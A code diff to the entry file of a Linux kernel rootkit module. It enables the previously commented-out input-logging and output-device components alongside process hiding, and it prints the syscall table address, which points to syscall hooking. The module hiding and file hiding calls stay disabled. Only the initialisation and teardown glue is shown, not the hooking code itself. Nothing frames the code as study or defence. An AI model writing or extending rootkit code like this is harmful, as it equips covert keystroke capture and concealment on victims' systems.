@@ -5,10 +5,10 @@
 #include <linux/init.h>	
 
 #include "common.h"
-// #include "logInput.h"
+#include "logInput.h"
 // #include "moduleHide.h"
 // #include "fileHide.h"
-// #include "outputDevice.h"
+#include "outputDevice.h"
 #include "processHider.h"
 
 //TODO: rename this to if wanting to be able to remove rootkit
@@ -21,17 +21,17 @@ static int __init main_init(void) {
 	printk("Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
 	printk("Syscall table is located at: %p\n", (void *) SYSCALL_TABLE);
 
-//	
-//	error = outputDevice_init();
-//	if (error) return error;
-//	
-//#ifndef DEV_MODE
-//	error = logInput_init();
-//	if (error) return error;
-//	
-//	error = moduleHide_start();
-//	if (error) return error;
-//#endif
+
+   error = outputDevice_init();
+   if (error) return error;
+
+#ifndef DEV_MODE
+	error = logInput_init();
+	if (error) return error;
+	
+	// error = moduleHide_start();
+	// if (error) return error;
+#endif
 //
 //	error = fileHide_start();
 //	if (error) return error;
@@ -46,11 +46,11 @@ static int __init main_init(void) {
 static void __exit main_exit(void) {
 	
 // 	fileHide_stop();
-// #ifndef DEV_MODE
-// 	moduleHide_stop();
-// 	logInput_exit();
-// #endif
-// 	outputDevice_exit();
+#ifndef DEV_MODE
+	//moduleHide_stop();
+	logInput_exit();
+#endif
+ 	outputDevice_exit();
 	processHider_exit();
 
 	printk(KERN_INFO "Rootkit uninstalled\n");
